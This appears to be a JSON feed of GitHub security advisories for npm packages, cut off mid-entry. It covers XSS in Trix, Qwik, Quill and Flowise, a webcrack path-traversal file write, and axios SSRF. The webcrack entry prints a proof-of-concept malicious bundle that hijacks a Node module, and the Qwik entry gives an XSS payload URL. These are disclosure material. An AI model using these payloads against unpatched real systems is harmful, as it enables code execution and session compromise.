{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>The Trix editor, versions prior to 2.1.4, is vulnerable to XSS when pasting malicious code. This vulnerability is a bypass of the fix put in place for <a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a>. In <a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a>, we added sanitation for Trix attachments with a <code>text/html</code> content type. However, Trix only checks the content type on the paste event's <code>dataTransfer</code> object. As long as the <code>dataTransfer</code> has a content type of <code>text/html</code>, Trix parses its contents and creates an <code>Attachment</code> with them, even if the attachment itself doesn't have a <code>text/html</code> content type. Trix then uses the attachment content to set the attachment element's <code>innerHTML</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker could trick a user to copy and paste malicious code that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><strong>Update Recommendation:</strong> Users should upgrade to Trix editor version 2.1.4 or later, which incorporates proper sanitization of input from copied content.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as <code>script-src 'self'</code> to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using <code>script-src-elem</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/pull/1156\">https://github.com/basecamp/trix/pull/1156</a></li>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.4\">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer\">MDN docs for <code>DataTransfer</code></a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was reported by HackerOne researcher <a href=\"https://hackerone.com/thwin_htet?type=user\">thwin_htet</a>. </p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99\">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv\">https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1149\">https://github.com/basecamp/trix/pull/1149</a></li>\n<li><a href=\"https://github.com/basecamp/trix/pull/1156\">https://github.com/basecamp/trix/pull/1156</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6\">https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer\">https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer</a></li>\n<li><a href=\"https://github.com/basecamp/trix/releases/tag/v2.1.4\">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qm2q-9f3q-2vcv\">https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qm2q-9f3q-2vcv",
            "title": "[trix] Trix has a cross-site Scripting vulnerability on copy & paste ",
            "date_modified": "2024-08-14T18:11:54.000Z",
            "date_published": "2024-08-14T18:11:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qm2q-9f3q-2vcv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.</p>\n<h3 id=\"details\">Details</h3>\n<p>Source: <a href=\"https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79\">packages/webcrack/src/unpack/bundle.ts#L79</a></p>\n<pre><code class=\"language-ts\">import { posix } from 'node:path';\nimport type { Module } from './module';\n\n// eslint-disable-next-line @typescript-eslint/unbound-method\nconst { dirname, join, normalize } = posix;\n\n/* ... snip ... */\n\nconst modulePath = normalize(join(path, module.path));\nif (!modulePath.startsWith(path)) {\n    throw new Error(`detected path traversal: ${module.path}`);\n}\nawait mkdir(dirname(modulePath), {\n    recursive: true\n});\nawait writeFile(modulePath, module.code, 'utf8');\n</code></pre>\n<p>In this code, the application explicitly relies on the POSIX version of path utilities (<code>dirname</code>, <code>join</code>, <code>normalize</code>) from Node.js. However, the vulnerability arises because the POSIX version of the <code>normalize</code> function does not recognize <code>\\</code> as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the <code>debug</code> module in Node.js:</p>\n<p><strong>Malicious Script (what.js):</strong></p>\n<pre><code class=\"language-js\">(function (e) {\n    var n = {};\n    function o(r) {\n      if (n[r]) {\n        return n[r].exports;\n      }\n      var a = (n[r] = {\n        i: r,\n        l: false,\n        exports: {},\n      });\n      e[r].call(a.exports, a, a.exports, o);\n      a.l = true;\n      return a.exports;\n    }\n    o.p = '';\n    o((o.s = 386));\n  })({\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index': function (e, t, n) {\n        module.exports = () =&gt; console.log(\"pwned\")\n    },\n  });\n</code></pre>\n<p><strong>Webcrack Script (index.js):</strong></p>\n<pre><code class=\"language-js\">import fs from 'fs';\nimport { webcrack } from 'webcrack';\n\nconst input = fs.readFileSync('what.js', 'utf8');\n\nconst result = await webcrack(input);\nconsole.log(result.code);\nconsole.log(result.bundle);\nawait result.save('output-dir');\n</code></pre>\n<p><strong>Execution:</strong>\nRunning the above script with <code>node index.js</code> twice results in the following output being printed to the terminal:</p>\n<pre><code>PS C:\\Webcrack&gt; node .\\index.js\nDebugger attached.\n(function (e) {\n  var n = {};\n  function o(r) {\n    if (n[r]) {\n      return n[r].exports;\n    }\n    var a = n[r] = {\n      i: r,\n      l: false,\n      exports: {}\n    };\n    e[r].call(a.exports, a, a.exports, o);\n    a.l = true;\n    return a.exports;\n  }\n  o.p = \"\";\n  o(o.s = 386);\n})({\n  \"./\\\\..\\\\node_modules\\\\debug\\\\src\\\\index\": function (e, t, n) {\n    module.exports = () =&gt; console.log(\"pwned\");\n  }\n});\nWebpackBundle {\n  type: 'webpack',\n  entryId: '386',\n  modules: Map(1) {\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index' =&gt; WebpackModule {\n      id: './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index',\n      isEntry: false,\n      path: '././\\\\..\\\\node_modules\\\\debug\\\\src\\\\index.js',\n      ast: [Object]\n    }\n  }\n}\nWaiting for the debugger to disconnect...\nPS C:\\Webcrack&gt; node .\\index.js\nDebugger attached.\npwned\npwned\npwned\npwned\npwned\npwned\npwned\nWaiting for the debugger to disconnect...\nfile:///C:/Webcrack/node_modules/webcrack/dist/index.js:444\n  if (options.log) logger(`${name}: started`);\n                   ^\n\nTypeError: logger is not a function\n    at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)\n    at Array.&lt;anonymous&gt; (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)\n    at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)\n    at async file:///C:/Webcrack/index.js:6:16\n\nNode.js v18.16.0\n</code></pre>\n<p>This demonstrates that the debug module was successfully overwritten and hijacked to print <code>pwned</code> to the console, confirming the arbitrary file write vulnerability has lead to code execution.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows an attacker to write arbitrary <code>.js</code> files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w\">https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w</a></li>\n<li><a href=\"https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999\">https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999</a></li>\n<li><a href=\"https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79\">https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ccqh-278p-xq6w\">https://github.com/advisories/GHSA-ccqh-278p-xq6w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ccqh-278p-xq6w",
            "title": "[webcrack] webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle",
            "date_modified": "2024-08-14T20:52:28.000Z",
            "date_published": "2024-08-14T18:01:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ccqh-278p-xq6w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39338\">https://nvd.nist.gov/vuln/detail/CVE-2024-39338</a></li>\n<li><a href=\"https://github.com/axios/axios/releases\">https://github.com/axios/axios/releases</a></li>\n<li><a href=\"https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html\">https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</a></li>\n<li><a href=\"https://github.com/axios/axios/issues/6463\">https://github.com/axios/axios/issues/6463</a></li>\n<li><a href=\"https://github.com/axios/axios/pull/6539\">https://github.com/axios/axios/pull/6539</a></li>\n<li><a href=\"https://github.com/axios/axios/pull/6543\">https://github.com/axios/axios/pull/6543</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a\">https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</a></li>\n<li><a href=\"https://github.com/axios/axios/releases/tag/v1.7.4\">https://github.com/axios/axios/releases/tag/v1.7.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8hc4-vh64-cxmj\">https://github.com/advisories/GHSA-8hc4-vh64-cxmj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8hc4-vh64-cxmj",
            "title": "[axios] Server-Side Request Forgery in axios",
            "date_modified": "2024-08-13T19:53:25.000Z",
            "date_published": "2024-08-12T15:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8hc4-vh64-cxmj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>izatop bunt v0.29.19 was discovered to contain a prototype pollution via the component /esm/qs.js. This vulnerability allows attackers to execute arbitrary code via injecting arbitrary properties.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38989\">https://nvd.nist.gov/vuln/detail/CVE-2024-38989</a></li>\n<li><a href=\"https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7\">https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7</a></li>\n<li><a href=\"https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b\">https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b</a></li>\n<li><a href=\"https://github.com/izatop/bunt/issues/27\">https://github.com/izatop/bunt/issues/27</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p734-xg27-8cfq\">https://github.com/advisories/GHSA-p734-xg27-8cfq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p734-xg27-8cfq",
            "title": "[@bunt/app] Prototype pollution in izatop bunt",
            "date_modified": "2024-08-13T19:23:51.000Z",
            "date_published": "2024-08-12T15:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p734-xg27-8cfq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in the HTML editor of Slab Quill allows an attacker to execute arbitrary JavaScript by storing an XSS payload (a crafted <code>onloadstart</code> attribute of an IMG element) in a text field. No patch exists and no further releases are planned.</p>\n<p>This CVE is disputed. Researchers have claimed that this issue is not within the product itself, but is intended behavior in a web browser. More information can be found <a href=\"https://github.com/quilljs/quill/issues/3364\">here</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3163\">https://nvd.nist.gov/vuln/detail/CVE-2021-3163</a></li>\n<li><a href=\"https://github.com/quilljs/quill/issues/3273\">https://github.com/quilljs/quill/issues/3273</a></li>\n<li><a href=\"https://github.com/quilljs/quill/issues/3359\">https://github.com/quilljs/quill/issues/3359</a></li>\n<li><a href=\"https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html\">https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html</a></li>\n<li><a href=\"https://quilljs.com\">https://quilljs.com</a></li>\n<li><a href=\"https://github.com/quilljs/quill/issues/3364\">https://github.com/quilljs/quill/issues/3364</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4943-9vgg-gr5r\">https://github.com/advisories/GHSA-4943-9vgg-gr5r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4943-9vgg-gr5r",
            "title": "[quill] Cross-site Scripting in quill",
            "date_modified": "2024-08-09T14:41:51.000Z",
            "date_published": "2021-05-10T15:38:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4943-9vgg-gr5r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>XmlNode::get_local_namespaces()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34394\">https://nvd.nist.gov/vuln/detail/CVE-2024-34394</a></li>\n<li><a href=\"https://github.com/marudor/libxmljs2/issues/205\">https://github.com/marudor/libxmljs2/issues/205</a></li>\n<li><a href=\"https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098\">https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78h3-pg4x-j8cv\">https://github.com/advisories/GHSA-78h3-pg4x-j8cv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-78h3-pg4x-j8cv",
            "title": "[libxmljs2] libxmljs2 vulnerable to type confusion when parsing specially crafted XML",
            "date_modified": "2024-08-07T20:35:44.000Z",
            "date_published": "2024-05-02T21:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-78h3-pg4x-j8cv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Prototype Pollution in 75lb deep-merge 1.1.1 allows attackers to execute arbitrary code or cause a Denial of Service (DoS) and cause other impacts via merge methods of lodash to merge objects.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38986\">https://nvd.nist.gov/vuln/detail/CVE-2024-38986</a></li>\n<li><a href=\"https://gist.github.com/mestrtee/b20c3aee8bea16e1863933778da6e4cb\">https://gist.github.com/mestrtee/b20c3aee8bea16e1863933778da6e4cb</a></li>\n<li><a href=\"https://github.com/75lb/deep-merge/issues/1\">https://github.com/75lb/deep-merge/issues/1</a></li>\n<li><a href=\"https://github.com/75lb/deep-merge/commit/a68541fac3c2372f1ca67effad825990ad8046e1\">https://github.com/75lb/deep-merge/commit/a68541fac3c2372f1ca67effad825990ad8046e1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-28mc-g557-92m7\">https://github.com/advisories/GHSA-28mc-g557-92m7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-28mc-g557-92m7",
            "title": "[@75lb/deep-merge] @75lb/deep-merge Prototype Pollution vulnerability",
            "date_modified": "2024-08-06T23:14:48.000Z",
            "date_published": "2024-07-30T21:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-28mc-g557-92m7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A potential mXSS vulnerability exists in Qwik for versions up to 1.6.0.</p>\n<h3 id=\"details\">Details</h3>\n<p>Qwik improperly escapes HTML on server-side rendering. It converts strings according to the following rules:</p>\n<p><a href=\"https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208\">https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208</a></p>\n<ul>\n<li>If the string is an attribute value:<ul>\n<li><code>\"</code> -&gt; <code>&amp;quot;</code></li>\n<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>\n<li>Other characters -&gt; No conversion</li>\n</ul>\n</li>\n<li>Otherwise:<ul>\n<li><code>&lt;</code> -&gt; <code>&amp;lt;</code></li>\n<li><code>&gt;</code> -&gt; <code>&amp;gt;</code></li>\n<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>\n<li>Other characters -&gt; No conversion</li>\n</ul>\n</li>\n</ul>\n<p>It sometimes causes the situation that the final DOM tree rendered on browsers is different from what Qwik expects on server-side rendering. This may be leveraged to perform XSS attacks, and a type of the XSS is known as mXSS (mutation XSS).</p>\n<h2 id=\"poc\">PoC</h2>\n<p>A vulnerable component:</p>\n<pre><code class=\"language-javascript\">import { component$ } from \"@builder.io/qwik\";\nimport { useLocation } from \"@builder.io/qwik-city\";\n\nexport default component$(() =&gt; {\n  \n  // user input\n  const { url } = useLocation();\n  const href = url.searchParams.get(\"href\") ?? \"https://example.com\";\n\n  return (\n    &lt;div&gt;\n      &lt;noscript&gt;\n        &lt;a href={href}&gt;test&lt;/a&gt;\n      &lt;/noscript&gt;\n    &lt;/div&gt;\n  );\n});\n</code></pre>\n<p>If a user accesses the following URL,</p>\n<pre><code>http://localhost:4173/?href=&lt;/noscript&gt;&lt;script&gt;alert(123)&lt;/script&gt;\n</code></pre>\n<p>then, <code>alert(123)</code> will be executed.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>XSS</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/QwikDev/qwik/security/advisories/GHSA-2rwj-7xq8-4gx4\">https://github.com/QwikDev/qwik/security/advisories/GHSA-2rwj-7xq8-4gx4</a></li>\n<li><a href=\"https://github.com/QwikDev/qwik/commit/7e742eb3a1001542d795776c0317d47df8b9d64e\">https://github.com/QwikDev/qwik/commit/7e742eb3a1001542d795776c0317d47df8b9d64e</a></li>\n<li><a href=\"https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208\">https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41677\">https://nvd.nist.gov/vuln/detail/CVE-2024-41677</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2rwj-7xq8-4gx4\">https://github.com/advisories/GHSA-2rwj-7xq8-4gx4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2rwj-7xq8-4gx4",
            "title": "[@builder.io/qwik] Qwik has a potential mXSS vulnerability due to improper HTML escaping",
            "date_modified": "2024-08-07T07:55:48.000Z",
            "date_published": "2024-08-06T18:24:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2rwj-7xq8-4gx4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A malicious homeserver could manipulate a user's account data to cause the client to enable URL previews in end-to-end encrypted rooms, in which case any URLs in encrypted messages would be sent to the server.</p>\n<p>Even if the CVSS score would be 4.1 (<a href=\"https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N&amp;version=3.1\">AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N</a>) the maintainer classifies this as High severity issue.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This was patched in matrix-react-sdk 3.105.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Deployments that trust their homeservers, as well as closed federations of trusted servers, are not affected.</p>\n<h3 id=\"references\">References</h3>\n<p>N/A.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-f83w-wqhc-cfp4\">https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-f83w-wqhc-cfp4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42347\">https://nvd.nist.gov/vuln/detail/CVE-2024-42347</a></li>\n<li><a href=\"https://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.105.1\">https://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.105.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f83w-wqhc-cfp4\">https://github.com/advisories/GHSA-f83w-wqhc-cfp4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f83w-wqhc-cfp4",
            "title": "[matrix-react-sdk] Matrix SDK for React's URL preview setting for a room is controllable by the homeserver",
            "date_modified": "2024-08-08T16:38:01.000Z",
            "date_published": "2024-08-06T14:12:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f83w-wqhc-cfp4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/chatflows-streaming/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37145\">https://nvd.nist.gov/vuln/detail/CVE-2024-37145</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L375-L375\">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L375-L375</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-858c-qxvx-rg9v\">https://github.com/advisories/GHSA-858c-qxvx-rg9v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-858c-qxvx-rg9v",
            "title": "[flowise] Flowise Cross-site Scripting in /api/v1/chatflows-streaming/id",
            "date_modified": "2024-08-05T21:29:30.000Z",
            "date_published": "2024-08-05T21:29:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-858c-qxvx-rg9v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/credentials/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37146\">https://nvd.nist.gov/vuln/detail/CVE-2024-37146</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L545-L545\">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L545-L545</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wxm4-9f8p-gggv\">https://github.com/advisories/GHSA-wxm4-9f8p-gggv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wxm4-9f8p-gggv",
            "title": "[flowise] Flowise Cross-site Scripting in/api/v1/credentials/id",
            "date_modified": "2024-08-05T21:29:30.000Z",
            "date_published": "2024-08-05T21:29:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wxm4-9f8p-gggv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>api/v1/chatflows/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36422\">https://nvd.nist.gov/vuln/detail/CVE-2024-36422</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L312-L312\">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L312-L312</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jch-qc96-9f5g\">https://github.com/advisories/GHSA-2jch-qc96-9f5g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jch-qc96-9f5g",
            "title": "[flowise] Flowise Cross-site Scripting in api/v1/chatflows/id",
            "date_modified": "2024-08-05T21:29:29.000Z",
            "date_published": "2024-08-05T21:29:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jch-qc96-9f5g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, a reflected cross-site scripting vulnerability occurs in the <code>/api/v1/public-chatflows/id</code> endpoint. If the default configuration is used (unauthenticated), an attacker may be able to craft a specially crafted URL that injects Javascript into the user sessions, allowing the attacker to steal information, create false popups, or even redirect the user to other websites without interaction. If the chatflow ID is not found, its value is reflected in the 404 page, which has type text/html. This allows an attacker to attach arbitrary scripts to the page, allowing an attacker to steal sensitive information. This XSS may be chained with the path injection to allow an attacker without direct access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36423\">https://nvd.nist.gov/vuln/detail/CVE-2024-36423</a></li>\n<li><a 